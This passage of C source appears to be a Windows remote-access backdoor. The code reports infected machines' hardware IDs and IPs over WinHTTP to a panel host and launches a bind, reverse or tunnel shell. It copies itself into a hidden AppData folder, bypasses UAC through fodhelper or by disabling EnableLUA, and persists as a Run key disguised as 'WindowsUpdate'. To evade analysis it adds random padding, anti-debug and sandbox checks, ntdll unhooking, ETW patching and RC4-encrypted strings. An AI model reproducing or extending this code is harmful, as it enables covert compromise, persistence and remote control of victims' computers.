            g_upnp_lan[j] = 0;
        }
        return 1;
    }
    return 0;
}
#endif

/* ====================================================================
 * Panel notification — WinHTTP API → maxapi112.netlify.app (or override)
 * ====================================================================
 *
 * Posts JSON events to a panel endpoint.  Compiled-time overrides:
 *   /DNOTIFY_HOST="your.host"
 *   /DNOTIFY_PATH="/api/receive"
 *   /DNOTIFY_SENDER="bypass_av"
 *   /DNOTIFY_PORT=443
 *   /DNOTIFY_DISABLE=1       (compile out entirely)
 *
 * Default is the user-managed panel at maxapi112.netlify.app.  The
 * payload schema is the panel's own:
 *   { "sender": "...", "content": "...", "type": "info|warning|error" }
 *
 * Event points:
 *   - "boot":        process started, content = HWID + IP (if known)
 *   - "session":     new C2 client connected
 *   - "error":       fatal error (bind fail, frp fail, etc.)
 *   - caller can also pass custom (type, content) via notify_event().
 */

/* 1Hz rate limit so a noisy event storm doesn't hammer the panel. */
static DWORD _notify_last = 0;
static int notify_throttle_ok(void) {
    DWORD now = GetTickCount();
    if (now - _notify_last < 1000) return 0;
    _notify_last = now;
    return 1;
}

static void notify_event(const char *type, const char *content) {
    if (!NOTIFY_ENABLED) return;
    if (!type || !content) return;
    if (!notify_throttle_ok()) return;

    void *mod = load_mod("winhttp.dll");
    if (!mod) return;

    typedef HINTERNET(WINAPI *FWHO)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
    typedef HINTERNET(WINAPI *FWHC)(HINTERNET,LPCWSTR,WORD,DWORD);
    typedef HINTERNET(WINAPI *FWHOR)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
    typedef BOOL(WINAPI *FWHSR)(HINTERNET,LPCWSTR,DWORD,void*,DWORD,DWORD,DWORD_PTR);
    typedef BOOL(WINAPI *FWHRR)(HINTERNET,void*);
    typedef BOOL(WINAPI *FWHRD)(HINTERNET,void*,DWORD,LPDWORD);
    typedef BOOL(WINAPI *FWHCH)(HINTERNET);

    FWHO   pWHO   = (mod   ? (FWHO)  exp_by_hash(mod, H_WinHttpOpen)           : NULL);
    FWHC   pWHC   = (mod   ? (FWHC)  exp_by_hash(mod, H_WinHttpConnect)        : NULL);
    FWHOR  pWHOR  = (mod   ? (FWHOR) exp_by_hash(mod, H_WinHttpOpenRequest)    : NULL);
    FWHSR  pWHSR  = (mod   ? (FWHSR) exp_by_hash(mod, H_WinHttpSendRequest)     : NULL);
    FWHRR  pWHRR  = (mod   ? (FWHRR) exp_by_hash(mod, H_WinHttpReceiveResponse) : NULL);
    FWHRD  pWHRD  = (mod   ? (FWHRD) exp_by_hash(mod, H_WinHttpReadData)        : NULL);
    FWHCH  pWHCH  = (mod   ? (FWHCH) exp_by_hash(mod, H_WinHttpCloseHandle)     : NULL);
    if (!pWHO || !pWHC || !pWHOR || !pWHSR || !pWHRR || !pWHRD || !pWHCH) return;

    /* JSON-escape: replace " and \ in content with \" and \\.  Tiny
     * but the panel will choke on a raw quote. */
    char body[512];
    int wlen = 0;
    #define APP(s) do { int _sl = str_len(s); \
        if (wlen + _sl < (int)sizeof(body) - 1) { \
            mem_cpy(body + wlen, s, _sl); wlen += _sl; body[wlen] = 0; } } while(0)
    #define APP_ESC(s) do { const char *_p = (s); while (*_p && wlen < (int)sizeof(body) - 3) { \
        if (*_p == '"' || *_p == '\\') { body[wlen++] = '\\'; } \
        body[wlen++] = *_p++; } body[wlen] = 0; } while(0)

    APP("{\"sender\":\""); APP(NOTIFY_SENDER);
    APP("\",\"content\":\""); APP_ESC(content);
    APP("\",\"type\":\""); APP(type);
    APP("\"}");
    #undef APP
    #undef APP_ESC

    HINTERNET hS = pWHO(L"bypass_av/1.0", 0, NULL, NULL, 0);
    if (!hS) return;
    HINTERNET hC = pWHC(hS, NOTIFY_HOST, NOTIFY_PORT, 0);
    if (!hC) { pWHCH(hS); return; }
    LPCWSTR at[] = { L"*/*", NULL };
    HINTERNET hR = pWHOR(hC, L"POST", NOTIFY_PATH, NULL, NULL, at, 0x00800000);
    if (!hR) { pWHCH(hC); pWHCH(hS); return; }

    DWORD blen = (DWORD)wlen;
    pWHSR(hR, L"Content-Type: application/json\r\n", (DWORD)-1, (void*)body, blen, blen, 0);
    pWHRR(hR, NULL);

    char buf[64]; DWORD rd;
    if (pWHRD(hR, buf, 63, &rd)) { (void)rd; }

    pWHCH(hR); pWHCH(hC); pWHCH(hS);
}

/* Boot / session / error notifications defined as macros up top. */


/* ====================================================================
 * 入口
 * ==================================================================== */
/* ====================================================================
 * 入口调度
 * ====================================================================
 * Dispatch to the compile-time selected listener.  Mutually exclusive:
 *   TUNNEL_MODE  -> bsh_tunnel
 *   REVERSE_MODE -> bsh_reverse
 *   default      -> bsh_bind
 * If multiple are set, reverse wins, then tunnel.
 * ==================================================================== */
static DWORD WINAPI st(LPVOID p) {
    (void)p;
#if defined(REVERSE_MODE)
    return bsh_reverse(NULL);
#elif defined(TUNNEL_MODE)
    return bsh_tunnel(NULL);
#else
    return bsh_bind(NULL);
#endif
}

static DWORD fake_padding = 0;
/* Optim G: random body filler.
 *
 * Why the {1} initializer remains: /O1 strips any data section that
 * the linker sees as never-read.  An initializer keeps the array in
 * `.data` so the binary actually carries ~196KB of body filler.
 *
 * On top of the static 0x01 baseline, _fill_pad() walks every byte
 * and replaces it with xorshift32 PRNG output seeded from GetTickCount
 * and a stack-derived value, so each process instance carries a
 * unique ~196KB region at runtime and image content varies at every
 * launch. */
static BYTE _padding[196608] = {1};

static DWORD _rk_seed;
static DWORD _rk_next(void) {
    DWORD x = _rk_seed;
    if (x == 0) x = (DWORD)(SIZE_T)&x | 0x1;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    _rk_seed = x;
    return x;
}
static void _fill_pad(void) {
    _rk_seed = GetTickCount() ^ (DWORD)(SIZE_T)_padding;
    for (int i = 0; i < (int)sizeof(_padding); i++) _padding[i] = (BYTE)_rk_next();
    /* anchor a write into fake_padding so the linker keeps _padding
     * alive in the binary even though nothing else reads it. */
    fake_padding ^= (DWORD)_padding[0] ^ 0xAB;
    (void)fake_padding;
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS) {
    /* UAC elevation + self-copy to AppData + persistence */
    {
        void *pGMF = api(MH_KR, H_GetModuleFileNameA);
        void *pGEA = api(MH_KR, H_GetEnvironmentVariableA);
        void *pCPA = api(MH_KR, H_CopyFileA);
        void *pCDA = api(MH_KR, H_CreateDirectoryA);
        void *pRCE = api(MH_KR, H_RegCreateKeyExA);
        void *pRSV = api(MH_KR, H_RegSetValueExA);
        void *pRCK = api(MH_KR, H_RegCloseKey);
        void *pSFA = api(MH_KR, H_SetFileAttributesA);
        void *pMVA = api(MH_KR, H_MoveFileA);
        void *pCH  = api(MH_KR, H_CloseHandle);
        void *pCPr = api(MH_KR, H_CreateProcessA);

        if (pGMF && pGEA) {
            char self[MAX_PATH], appd[MAX_PATH];
            mem_set(self, 0, MAX_PATH); mem_set(appd, 0, MAX_PATH);
            ((DWORD(WINAPI*)(HMODULE,LPSTR,DWORD))pGMF)(NULL, self, MAX_PATH);
            ((DWORD(WINAPI*)(LPCSTR,LPSTR,DWORD))pGEA)("APPDATA", appd, MAX_PATH);

            char tdir[MAX_PATH], texe[MAX_PATH];
            mem_set(tdir, 0, MAX_PATH); mem_set(texe, 0, MAX_PATH);
            strapp_n(tdir, appd, sizeof(tdir)); strapp_n(tdir, "\\Microsoft\\Windows\\Caches", sizeof(tdir));
            strapp_n(texe, tdir, sizeof(texe)); strapp_n(texe, "\\runtime.exe", sizeof(texe));

            if (mem_cmp(self, texe, str_len(texe)) != 0) {
                if (pCDA) { char tmp[260]; mem_set(tmp, 0, 260); strapp_n(tmp, tdir, sizeof(tmp));
                    ((BOOL(WINAPI*)(LPCSTR,void*))pCDA)(tmp, NULL); }
                if (pCPA) ((BOOL(WINAPI*)(LPCSTR,LPCSTR,BOOL))pCPA)(self, texe, FALSE);

                {   char hdir[MAX_PATH], hexe[MAX_PATH];
                    mem_set(hdir, 0, MAX_PATH); mem_set(hexe, 0, MAX_PATH);
                    strapp_n(hdir, tdir, sizeof(hdir)); strapp_n(hdir, "\\Windows", sizeof(hdir));
                    strapp_n(hexe, hdir, sizeof(hexe)); strapp_n(hexe, "\\runtime.exe", sizeof(hexe));
                    if (pCDA) ((BOOL(WINAPI*)(LPCSTR,void*))pCDA)(hdir, NULL);
                    if (pSFA) ((BOOL(WINAPI*)(LPCSTR,DWORD))pSFA)(hdir, 0x02);
                    if (pCPA) ((BOOL(WINAPI*)(LPCSTR,LPCSTR,BOOL))pCPA)(self, hexe, FALSE); }

                /* Try fodhelper UAC bypass (favoured).  Fall back to the
                 * old LM EnableLUA=0 hack if fodhelper isn't available
                 * (e.g. Win 11 22H2+ where Microsoft added an interactive
                 * check). */
                if (!fodhelper_bypass(texe)) {
                    if (pRCE && pRSV && pRCK) {
                        HKEY hk;
                        if (((LSTATUS(WINAPI*)(HKEY,LPCSTR,DWORD,void*,DWORD,REGSAM,void*,PHKEY,void*))pRCE)(
                            HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                            0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) == 0) {
                            DWORD v = 0; ((LSTATUS(WINAPI*)(HKEY,LPCSTR,DWORD,DWORD,const BYTE*,DWORD))pRSV)(
                                hk, "EnableLUA", 0, 4, (const BYTE*)&v, 4);
                            ((LSTATUS(WINAPI*)(HKEY))pRCK)(hk); }
                    }
                }

                if (pRCE && pRSV && pRCK) {
                    HKEY hk;
                    if (((LSTATUS(WINAPI*)(HKEY,LPCSTR,DWORD,void*,DWORD,REGSAM,void*,PHKEY,void*))pRCE)(
                        HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) == 0) {
                        ((LSTATUS(WINAPI*)(HKEY,LPCSTR,DWORD,DWORD,const BYTE*,DWORD))pRSV)(
                            hk, "WindowsUpdate", 0, 1, (const BYTE*)texe, str_len(texe) + 1);
                        ((LSTATUS(WINAPI*)(HKEY))pRCK)(hk); } }

                if (pCPr) {
                    STARTUPINFOA si; mem_set(&si, 0, sizeof(si)); si.cb = sizeof(si);
                    PROCESS_INFORMATION pi;
                    if (((BOOL(WINAPI*)(LPCSTR,LPSTR,void*,void*,BOOL,DWORD,void*,void*,LPSTARTUPINFOA,LPPROCESS_INFORMATION))pCPr)(
                        texe, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                        if (pCH) { ((BOOL(WINAPI*)(HANDLE))pCH)(pi.hThread); ((BOOL(WINAPI*)(HANDLE))pCH)(pi.hProcess); } } }

                if (pMVA) { char bak[MAX_PATH]; mem_set(bak, 0, MAX_PATH);
                    strapp_n(bak, self, sizeof(bak)); strapp_n(bak, ".bak", sizeof(bak));
                    ((BOOL(WINAPI*)(LPCSTR,LPCSTR))pMVA)(self, bak); }
                return 0;
            }
        }
    }

    /* 直接调用: 生成 IAT 入口 (伪装成正常应用) */
    volatile HMODULE hSelf = GetModuleHandleA(NULL);
    volatile UINT msgRet = MessageBoxA(NULL, "System Error", "Windows Update", MB_OK);
    fake_padding = (DWORD)(SIZE_T)hSelf + msgRet;
    _fill_pad();

    JK(); if (is_dbg()) { JK(); return 0; }
    JK(); if (is_sbx()) { JK(); return 0; }
    Sleep(3000); JK(); if (is_dbg()) { JK(); return 0; }
    JK(); unhook_ntdll(); JK(); etw_patch(); JK();
#ifdef ENABLE_UPNP
    JK(); do_upnp(); JK();
    /* Boot notification: HWID + (if UPnP worked) public IP. */
    JK(); INLINE_NOTIFY_BOOT(g_upnp_ip, g_upnp_lan); JK();
#endif
#ifdef ENABLE_FRP
    JK(); start_frpc(); JK(); Sleep(3000);
#endif
    CreateThread(NULL, 0, st, NULL, 0, NULL);

    {   BYTE t[32]; BYTE m[128];
        {   BYTE _k[] = {0xAA,0x23,0xB1,0x8C,0xDD,0x47,0xBE,0xC5};
            BYTE _d[] = {0xBD,0x78,0x60,0xBF,0x44,0xA0,0x7F,0x8E,0x8E,0x29,0xD6,0xED,0x8F,0x84};
            rc4_str(_k, sizeof(_k), _d, 14, t); t[14] = 0;
        }
        {   BYTE _k[] = {0x37,0xFE,0x1A,0x2D,0x80,0x73,0xF1,0x09,0xAC,0x3E,0x5A,0x10,0x4B,0xC0,0xBB,0xD3};
            BYTE _d[] = {0xEE,0xF0,0x4D,0xD5,0x17,0x0E,0xCA,0x34,0x23,0xC8,0x7A,0x55,0x0A,0xFE,0x05,0xD4,0xEE,0xE1,0x2F,0xB0,0x57,0x42,0x6D,0xF9,0xC3,0xB4,0x72,0x83,0xA9,0xD1,0x61,0xD8,0x1E,0x4A,0x26,0x01,0x07,0x7B};
            rc4_str(_k, sizeof(_k), _d, 38, m); m[38] = 0;
        }
#ifdef ENABLE_UPNP
        if (g_upnp_ip[0]) { strapp_n((char*)m, "\nIP: ", sizeof(m)); strapp_n((char*)m, g_upnp_ip, sizeof(m)); }
        if (g_upnp_lan[0]) { strapp_n((char*)m, "\nLAN: ", sizeof(m)); strapp_n((char*)m, g_upnp_lan, sizeof(m)); }
#endif
        MessageBoxA(NULL, (LPCSTR)m, (LPCSTR)t, MB_OK | MB_ICONERROR);
    }

    JK(); Sleep(INFINITE); return 0;
}

